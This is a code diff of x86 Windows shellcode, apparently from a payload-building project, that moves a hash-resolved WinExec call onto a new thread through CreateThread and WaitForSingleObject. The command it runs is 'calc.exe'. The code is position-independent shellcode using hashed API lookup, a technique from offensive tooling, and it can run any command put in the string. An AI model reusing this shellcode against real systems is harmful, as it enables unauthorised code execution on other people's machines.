@@ -12,32 +12,34 @@ entry:
   ; clear the direction flag
   cld
 
-  ; find "kernel32.dll, WinExec"
-  push 0x61DA2999               ; set hash key
-  push 0x0AE20914               ; set function hash
-  call find_api                 ; try to find api address
-  cmp eax, 0                    ; check target function is found
-  jz not_found                  ;
-
   ; ensure stack is 16 bytes aligned
   push edi                      ; store edi
   mov edi, esp                  ; store current to edi
   and edi, 0xF                  ; calculate the offset
   sub esp, edi                  ; adjust current stack
 
-  ; call WinExec
-  lea edx, [ebx+command]        ; lpCmdLine
-  xor ecx, ecx                  ; clear ecx
-  mov cl, [ebx+cmd_show]        ; set uCmdShow
-  push ecx                      ; push uCmdShow
-  push edx                      ; push lpCmdLine
-  call eax                      ; call api function
+  ; call "kernel32.dll, CreateThread"
+  push 0                        ; lpThreadId
+  push 0                        ; dwCreationFlags
+  push ebx                      ; lpParameter, set entry address
+  lea ecx, [ebx+API_WinExec]    ; calculate function address
+  push ecx                      ; lpStartAddress
+  push 0                        ; dwStackSize
+  push 0                        ; lpThreadAttributes
+  push 0xE2C019B2               ; set hash key
+  push 0x2160C16A               ; set function hash
+  call api_call                 ; call api function
+
+  ; call "kernel32.dll, WaitForSingleObject"
+  push eax                      ; set thread handle
+  push 0x0F929559               ; set hash key
+  push 0x2811A50E               ; set function hash
+  call api_call                 ; call api function
 
   ; restore aligned stack
   add esp, edi                  ; restore stack from edi
   pop edi                       ; restore edi
 
-  not_found:                    ;
   ; restore context
   pop ebx                       ; restore ebx
   ret                           ; return to the caller
@@ -51,6 +53,36 @@ calc_entry_addr:
 
 hash_api:
   %include "../../../src/x86/api_call.asm"
+
+; call "kernel32.dll, WinExec"
+API_WinExec:
+  push ebx                      ; store ebx
+  mov ebx, ecx                  ; read entry address from ecx
+
+  ; clear the direction flag
+  cld
+
+  ; ensure stack is 16 bytes aligned
+  push edi                      ; store edi
+  mov edi, esp                  ; store current to edi
+  and edi, 0xF                  ; calculate the offset
+  sub esp, edi                  ; adjust current stack
+
+  lea edx, [ebx+command]        ; lpCmdLine
+  xor ecx, ecx                  ; clear ecx
+  mov cl, [ebx+cmd_show]        ; set uCmdShow
+  push ecx                      ; push uCmdShow
+  push edx                      ; push lpCmdLine
+  push 0x61DA2999               ; set hash key
+  push 0x0AE20914               ; set function hash
+  call api_call                 ; call api function
+
+  ; restore aligned stack
+  add esp, edi                  ; restore stack from edi
+  pop edi                       ; restore edi
+
+  pop ebx                       ; restore ebx
+  ret                           ; exit thread
 
 command:
   db "calc.exe", 0
